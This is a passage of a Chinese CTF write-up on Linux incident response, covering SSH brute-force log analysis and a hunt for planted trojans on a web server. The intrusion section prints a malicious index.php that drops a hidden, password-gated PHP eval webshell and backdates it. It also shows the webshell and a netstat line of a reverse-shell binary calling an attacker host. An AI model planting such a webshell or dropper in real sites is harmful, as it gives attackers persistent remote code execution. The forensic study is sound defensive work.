192.168.200.31</span><br></pre></td></tr></table></figure></div><p>解释</p><blockquote><p>这个命令用于分析 Linux 系统中 <code>/var/log/auth.log.1</code> 文件里关于 root 用户登录失败的记录。我们来一步步拆解和分析这条命令：</p><hr><h3 id="完整命令："><a href="#完整命令：" class="headerlink" title="完整命令："></a>完整命令：</h3><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Failed password for root&quot;</span> | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br></pre></td></tr></table></figure></div><hr><h3 id="各部分含义："><a href="#各部分含义：" class="headerlink" title="各部分含义："></a>各部分含义：</h3><ol><li><strong><code>cat auth.log.1</code></strong></li></ol><ul><li>读取日志文件 <code>auth.log.1</code> 的内容（通常是旧的认证日志）。</li></ul><ol start="2"><li><strong><code>grep -a &quot;Failed password for root&quot;</code></strong></li></ol><ul><li>过滤出包含 <code>&quot;Failed password for root&quot;</code> 的行，这些行表示 root 用户尝试登录但密码错误。</li><li><code>-a</code> 是让 grep 把二进制文件当作文本文件处理（有时日志中可能包含非文本字符）。</li></ul><ol start="3"><li><strong><code>awk &#39;&#123;print $11&#125;&#39;</code></strong></li></ol><ul><li><p>从每一行中提取第 11 列，一般是登录尝试的 IP 地址。</p></li><li><p>举个例子：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apr  2 10:20:10 server sshd[12345]: Failed password for root from 192.168.0.123 port 51854 ssh2</span><br></pre></td></tr></table></figure></div><p>第11列就是 IP：<code>192.168.0.123</code></p></li></ul><ol start="4"><li><strong><code>sort</code></strong></li></ol><ul><li>对提取出来的 IP 地址进行排序（为后面的去重计数做准备）。</li></ul><ol start="5"><li><strong><code>uniq -c</code></strong></li></ol><ul><li>对相邻的相同 IP 计数，输出格式如：<code>5 192.168.0.123</code>，表示这个 IP 出现了 5 次。</li></ul><ol start="6"><li><strong><code>sort -nr</code></strong></li></ol><ul><li>按照数量从大到小排序（n：数字，r：倒序），可以看到哪些 IP 尝试最多。</li></ul><ol start="7"><li><strong><code>more</code></strong></li></ol><ul><li>分页显示，便于查看大量结果。</li></ul><hr><h3 id="最终效果："><a href="#最终效果：" class="headerlink" title="最终效果："></a>最终效果：</h3><p>你会得到一个<strong>按尝试次数排序的 IP 列表</strong>，比如：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">20 192.168.1.10</span><br><span class="line">15 10.0.0.5</span><br><span class="line">7  203.0.113.45</span><br></pre></td></tr></table></figure></div><p>这些 IP 都是在尝试暴力破解 root 用户密码，尝试次数越多，危险性可能越高。</p><hr><h3 id="实用建议："><a href="#实用建议：" class="headerlink" title="实用建议："></a>实用建议：</h3><ul><li>可以根据这些 IP 做封禁，例如使用 <code>iptables</code> 或 <code>fail2ban</code>。</li><li>建议禁用 root 用户远程 SSH 登录，或者启用密钥认证，提高系统安全性。</li></ul></blockquote><p><code>awk</code> 是一个文本处理工具，用于按字段处理文本。</p><p><code>&#123;print $11&#125;</code> 表示打印每行的第11个字段。假设日志格式为标准格式，第11个字段通常是IP地址。</p><p><code>sort</code> 命令用于对输入行进行排序 。<code>uniq</code> 命令用于删除重复的行，<code>-c</code> 选项表示对每个唯一的行计数，即统计每个IP地址的出现次数。</p><blockquote><p>在Mash1r0看到一点小汇总，收藏一下：</p><p>这些命令，在这个环境作用不大，但是对于日志非常多的环境是很有用的，可以进行参考一下。</p><ul><li><p><strong>sort -nr</strong>: <code>sort</code> 命令再次用于排序。<code>-n</code> 选项表示按数值进行排序。<code>-r</code> 选项表示按降序排序。组合起来，即按出现次数从高到低排序。</p></li><li><p><code>more</code> 命令用于分页显示输出。由于输出可能很长，<code>more</code> 命令允许用户逐页查看结果。</p></li></ul></blockquote><p>所以flag:<code>flag&#123;192.168.200.2,192.168.200.31,192.168.200.32&#125;</code></p><h2 id="步骤2-1"><a href="#步骤2-1" class="headerlink" title="步骤2"></a>步骤2</h2><blockquote><p>2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</p></blockquote><p>这个命令不也就和前面类似了，我们先找到成功登录的模版。然后筛选即可。</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Accepted password for root&quot;</span> | awk <span class="string">&#x27;&#123;print$11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br><span class="line">      2 192.168.200.2</span><br></pre></td></tr></table></figure></div><p>所以flag:<code>flag&#123;192.168.200.2&#125;</code></p><h2 id="步骤3-1"><a href="#步骤3-1" class="headerlink" title="步骤3"></a>步骤3</h2><blockquote><p>3.爆破用户名字典是什么？如果有多个使用”,”分割</p></blockquote><p>我们要找到爆破的字典，肯定是还要做筛选的命令，Failed和Accepted的筛选肯定必不可少，我们需要找到所有尝试过的用户名。</p><p>我们先找到一个模版再进行筛选。</p><p><code>Aug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2</code></p><p>可以看到user后面的hello用户名这个关键字在第11个字段。然后看了一下成功登录的并没有其他用户，只有root。</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Accepted&quot;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br><span class="line">      1 Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 46563 ssh2</span><br><span class="line">      1 Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 48070 ssh2</span><br></pre></td></tr></table></figure></div><h3 id="命令1"><a href="#命令1" class="headerlink" title="命令1"></a>命令1</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# cat auth.log.1 | grep -aoP &quot;Failed password for invalid user(.*)from&quot; | uniq -c | sort -r</span><br><span class="line">      5 Failed password for invalid user user from</span><br><span class="line">      5 Failed password for invalid user hello from</span><br><span class="line">      5 Failed password for invalid user  from</span><br><span class="line">      1 Failed password for invalid user test3 from</span><br><span class="line">      1 Failed password for invalid user test2 from</span><br><span class="line">      1 Failed password for invalid user test1 from</span><br></pre></td></tr></table></figure></div><p>这里的grep的有关参数如下：</p><ul><li><code>-o</code>：只输出匹配的部分。</li><li><code>-P</code>：使用 Perl 兼容的正则表达式</li></ul><p>sort -t是降序的意思。</p><p>然后会匹配到中间用户名的部分。</p><h3 id="命令2"><a href="#命令2" class="headerlink" title="命令2"></a>命令2</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# cat auth.log.1 | grep -a &quot;Failed password&quot; |perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line">      5  invalid user user</span><br><span class="line">      5  invalid user hello</span><br><span class="line">      5  invalid user</span><br><span class="line">      4  root</span><br><span class="line">      1  root</span><br><span class="line">      1  root</span><br><span class="line">      1  invalid user test3</span><br><span class="line">      1  invalid user test2</span><br><span class="line">      1  invalid user test1</span><br></pre></td></tr></table></figure></div><p>来源：<a href="https://blog.csdn.net/administratorlws/article/details/139560740">玄机——第一章 应急响应-Linux日志分析 wp</a></p><p>所以flag:<code>flag&#123;user,hello,root,test3,test2,test1&#125;</code></p><h2 id="步骤4-1"><a href="#步骤4-1" class="headerlink" title="步骤4"></a>步骤4</h2><blockquote><p>4.成功登录 root 用户的 ip 一共爆破了多少次</p></blockquote><p>直接参考第一次命令的次数就行了</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Failed password for root&quot;</span> | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br><span class="line">root@ip-10-0-10-2:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;Accepted&quot;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br><span class="line">      1 Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 46563 ssh2</span><br><span class="line">      1 Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 48070 ssh2</span><br></pre></td></tr></table></figure></div><p>成功登录的是192.168.200.2的ip，一共4次</p><p>所以flag:<code>flag&#123;4&#125;</code></p><h2 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h2><blockquote><p>5.黑客登陆主机后新建了一个后门用户，用户名是多少</p></blockquote><p>通常与用户登录和用户管理活动相关的日志文件是 <code>/var/log/auth.log</code> 或其备份文件如 <code>/var/log/auth.log.1</code>。</p><p>我们直接<code>users</code>，是看不到的，在看备份文件前，我们可以先看看<code>/etc/shadow</code>。</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:~# <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$6$V5ItX87cUllL5G4h<span class="variable">$yATBAGCLFnkAoW4erj4cBGT9mXg3kdqkItr8xX</span>.64LJwsq48qDeukrTkOwoTE6TSYnaTDfSRvpWiq/BIMmhom/:19570:0:99999:7:::</span><br><span class="line">daemon:*:19314:0:99999:7:::</span><br><span class="line">bin:*:19314:0:99999:7:::</span><br><span class="line">sys:*:19314:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19314:0:99999:7:::</span><br><span class="line">games:*:19314:0:99999:7:::</span><br><span class="line">man:*:19314:0:99999:7:::</span><br><span class="line">lp:*:19314:0:99999:7:::</span><br><span class="line">mail:*:19314:0:99999:7:::</span><br><span class="line">news:*:19314:0:99999:7:::</span><br><span class="line">uucp:*:19314:0:99999:7:::</span><br><span class="line">proxy:*:19314:0:99999:7:::</span><br><span class="line">www-data:*:19314:0:99999:7:::</span><br><span class="line">backup:*:19314:0:99999:7:::</span><br><span class="line">list:*:19314:0:99999:7:::</span><br><span class="line">irc:*:19314:0:99999:7:::</span><br><span class="line">gnats:*:19314:0:99999:7:::</span><br><span class="line">nobody:*:19314:0:99999:7:::</span><br><span class="line">_apt:*:19314:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19314:0:99999:7:::</span><br><span class="line">systemd-network:*:19314:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19314:0:99999:7:::</span><br><span class="line">messagebus:*:19314:0:99999:7:::</span><br><span class="line">unscd:*:19314:0:99999:7:::</span><br><span class="line">ntp:*:19314:0:99999:7:::</span><br><span class="line">sshd:*:19314:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:19322::::::</span><br><span class="line">test2:$6$oIpMwQHVAWKNjsi1<span class="variable">$kMV6ZNSOTZfqnNSxqMkl9tLj</span>/1Y5KOJMZBzCu.qQgFxezvXrn..gHkt8lieFTDVCUI0PhVASNpZvKCJwsN3gH1:19570:0:99999:7:::</span><br><span class="line">debian:!:19570:0:99999:7:::</span><br></pre></td></tr></table></figure></div><p>可以很明确的看到两个特长的密码，猜测test2为新创的隐藏用户。为了进一步的验证，我们还是去看看日志文件比较好。</p><p>而且我们只能在备份的文件里面看到new的内容。</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:~# <span class="built_in">cd</span> /var/log</span><br><span class="line">root@ip-10-0-10-1:/var/log# <span class="built_in">cat</span> auth.log | grep -a <span class="string">&quot;new&quot;</span></span><br><span class="line">root@ip-10-0-10-1:/var/log# <span class="built_in">cat</span> auth.log.1 | grep -a <span class="string">&quot;new&quot;</span></span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new group: name=debian, GID=1001</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash</span><br></pre></td></tr></table></figure></div><p>我们还可以 结合其他日志文件，如 <code>/var/log/syslog</code>，查看是否有异常的命令执行或系统变更。但是好像这个环境没什么异常。</p><p>所以flag:<code>flag&#123;test2&#125;</code></p><h1 id="第一章-应急响应-Linux入侵排查"><a href="#第一章-应急响应-Linux入侵排查" class="headerlink" title="第一章 应急响应- Linux入侵排查"></a>第一章 应急响应- Linux入侵排查</h1><blockquote><p>简介</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;账号：root 密码：linuxruqin</span><br><span class="line">&gt;ssh root@IP</span><br><span class="line">&gt;1.web目录存在木马，请找到木马的密码提交</span><br><span class="line">&gt;2.服务器疑似存在不死马，请找到不死马的密码提交</span><br><span class="line">&gt;3.不死马是通过哪个文件生成的，请提交文件名</span><br><span class="line">&gt;4.黑客留下了木马文件，请找出黑客的服务器ip提交</span><br><span class="line">&gt;5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</span><br></pre></td></tr></table></figure></div></blockquote><h2 id="步骤1-2"><a href="#步骤1-2" class="headerlink" title="步骤1"></a>步骤1</h2><blockquote><p>web目录存在木马，请找到木马的密码提交</p></blockquote><p>用下面的命令</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;eval&quot;</span></span><br></pre></td></tr></table></figure></div><p>解释</p><blockquote><p>这行命令的作用是查找当前目录及其子目录下所有 <code>.php</code> 文件中包含 <code>eval</code> 字符串的行。</p><p>具体解释如下：</p><ol><li><code>find . -type f -name &quot;*.php&quot;</code>：</li></ol><ul><li><code>find</code> 是用来在文件系统中查找文件的命令。</li><li><code>.</code> 表示从当前目录开始查找。</li><li><code>-type f</code> 表示查找类型为文件（而非目录、链接等其他类型）的文件。</li><li><code>-name &quot;*.php&quot;</code> 表示查找所有扩展名为 <code>.php</code> 的文件。</li></ul><p> 这部分命令会返回所有 <code>.php</code> 文件的路径。</p><ol start="2"><li><p><code>|</code>：<br> 管道符号 <code>|</code> 将前一个命令的输出传递给后一个命令。</p></li><li><p><code>xargs grep &quot;eval&quot;</code>：</p></li></ol><ul><li><code>xargs</code> 是一个将标准输入转换为命令行参数的工具。在这里，它将 <code>find</code> 命令输出的 <code>.php</code> 文件列表传递给 <code>grep</code> 命令。</li><li><code>grep &quot;eval&quot;</code> 是用来搜索文件中包含 <code>eval</code> 字符串的行。</li></ul><p> 所以，<code>xargs grep &quot;eval&quot;</code> 会在之前通过 <code>find</code> 查找到的所有 <code>.php</code> 文件中，搜索并显示包含 <code>eval</code> 字符串的行。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>这行命令通过 <code>find</code> 查找所有 <code>.php</code> 文件，再用 <code>grep</code> 检查这些文件中是否包含 <code>eval</code> 代码。<code>eval</code> 是 PHP 中的一个危险函数，它会执行传入的字符串代码，常常被用来执行动态生成的代码。</p></blockquote><p>可以发现有三个文件中存在。</p><p>我们依次去看看具体的文件内容。会发现只有1.php是简单的一句话木马。而另外两个像是通过index.php生成了隐藏文件<code>.shell.php</code>。</p><p>我们的第二步骤里面是找不死马，所以可以明确一点是1.php是步骤1里面我们需要的普通木马，而后面的<code>.shell.php</code>是步骤2的不死马。</p><p>flag:<code>flag&#123;1&#125;</code></p><h2 id="步骤2-2"><a href="#步骤2-2" class="headerlink" title="步骤2"></a>步骤2</h2><blockquote><p>服务器疑似存在不死马，请找到不死马的密码提交</p></blockquote><p>在前面已经分析过不死马对应的是哪个文件，这里的密码对应的是md5加密的部分，而不是连接的密码。我们拿去爆破解密就行了。</p><p>flag:<code>flag&#123;hello&#125;</code></p><h2 id="步骤3-2"><a href="#步骤3-2" class="headerlink" title="步骤3"></a>步骤3</h2><blockquote><p>不死马是通过哪个文件生成的，请提交文件名</p></blockquote><p>这个前面也分析过了，是用index.php生成了一个.shell.php。</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ip-<span class="number">10</span>-<span class="number">0</span>-<span class="number">10</span>-<span class="number">1</span>:/<span class="keyword">var</span>/www/html<span class="comment"># cat index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(SYS_ROOT.INC.<span class="string">&#x27;common.php&#x27;</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>].(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]?<span class="string">&#x27;?&#x27;</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]):<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$path</span>, <span class="number">0</span>,<span class="number">1</span>)==<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$path</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$path</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$path</span> = <span class="title class_">Base</span>::<span class="title function_ invoke__">safeword</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$ctrl</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]:<span class="string">&#x27;run&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;createprocess&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="title class_">Index</span>::<span class="title function_ invoke__">createhtml</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="number">0</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;single&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title class_">Index</span>::<span class="title function_ invoke__">run</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/var/www/html/.shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>看一下<code>.shell.php</code></p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:/var/www/html# <span class="built_in">cat</span> .shell.php</span><br><span class="line">&lt;?php <span class="keyword">if</span>(md5(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>])==<span class="string">&quot;5d41402abc4b2a76b9719d911017c592&quot;</span>)&#123;@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[cmd]);&#125;?&gt;</span><br></pre></td></tr></table></figure></div><p>flag:<code>flag&#123;index.php&#125;</code></p><h2 id="步骤4-2"><a href="#步骤4-2" class="headerlink" title="步骤4"></a>步骤4</h2><blockquote><p>黑客留下了木马文件，请找出黑客的服务器ip提交</p></blockquote><p>我们先去<code>/var/log</code>下面寻找对应的日志文件。</p><p>先看<code>auth.log</code>里面有没有进行暴力破解的痕迹</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:/var/log# <span class="built_in">cat</span> auth.log</span><br><span class="line">Apr  2 02:52:37 ip-10-0-10-1 sshd[833]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=223.104.67.124  user=root</span><br><span class="line">Apr  2 02:52:38 ip-10-0-10-1 sshd[833]: Failed password <span class="keyword">for</span> root from 223.104.67.124 port 62100 ssh2</span><br><span class="line">Apr  2 02:52:50 ip-10-0-10-1 sshd[833]: Accepted password <span class="keyword">for</span> root from 223.104.67.124 port 62100 ssh2</span><br><span class="line">Apr  2 02:52:50 ip-10-0-10-1 sshd[833]: pam_unix(sshd:session): session opened <span class="keyword">for</span> user root by (uid=0)</span><br><span class="line">Apr  2 02:52:50 ip-10-0-10-1 systemd-logind[430]: New session 1 of user root.</span><br><span class="line">Apr  2 02:52:50 ip-10-0-10-1 systemd: pam_unix(systemd-user:session): session opened <span class="keyword">for</span> user root by (uid=0)</span><br><span class="line">Apr  2 02:56:05 ip-10-0-10-1 sshd[858]: Invalid user 0 from 185.246.128.133 port 6750</span><br><span class="line">Apr  2 02:56:05 ip-10-0-10-1 sshd[858]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Apr  2 02:56:05 ip-10-0-10-1 sshd[858]: pam_unix(sshd:auth): authentication failure; <span class="built_in">logname</span>= uid=0 euid=0 <span class="built_in">tty</span>=ssh ruser= rhost=185.246.128.133</span><br><span class="line">Apr  2 02:56:07 ip-10-0-10-1 sshd[858]: Failed password <span class="keyword">for</span> invalid user 0 from 185.246.128.133 port 6750 ssh2</span><br><span class="line">Apr  2 02:56:09 ip-10-0-10-1 sshd[858]: Connection reset by invalid user 0 185.246.128.133 port 6750 [preauth]</span><br></pre></td></tr></table></figure></div><p>发现日志文件里面是不存在有shell.php的</p><p>再看登录成功的IP提交发现不对</p><p>重新看看有没有新线索，发现html下面有一个可疑的elf文件，linux中的可执行文件</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:~# netstat -antlp | more</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      577/mysqld</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      505/sshd</span><br><span class="line">tcp        0      1 10.0.10.1:38474         10.11.55.21:3333        SYN_SENT    967/./shell(1).elf</span><br><span class="line">tcp        0      0 10.0.10.1:22            223.104.67.124:62100    ESTABLISHED 833/sshd: root@pts/</span><br><span class="line">tcp        0     36 10.0.10.1:22            223.104.67.124:62102    ESTABLISHED 971/sshd: root@pts/</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      513/apache2</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      505/sshd</span><br></pre></td></tr></table></figure></div><p>所以flag:<code>flag&#123;10.11.55.21&#125;</code></p><h2 id="步骤5-1"><a href="#步骤5-1" class="headerlink" title="步骤5"></a>步骤5</h2><blockquote><p>黑客留下了木马文件，请找出黑客服务器开启的监端口提交</p></blockquote><p>在步骤4里面已经分析过了，里面也有对应的端口号直接提交即可。</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:~# netstat -antlp | more</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      577/mysqld</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      505/sshd</span><br><span class="line">tcp        0      1 10.0.10.1:38474         10.11.55.21:3333        SYN_SENT    967/./shell(1).elf</span><br><span class="line">tcp        0      0 10.0.10.1:22            223.104.67.124:62100    ESTABLISHED 833/sshd: root@pts/</span><br><span class="line">tcp        0     36 10.0.10.1:22            223.104.67.124:62102    ESTABLISHED 971/sshd: root@pts/</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      513/apache2</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      505/sshd</span><br></pre></td></tr></table></figure></div><p>所以flag:<code>flag&#123;3333&#125;</code></p><h1 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h1><p><a href="https://blog.csdn.net/administratorlws/article/details/139560740">玄机——第一章 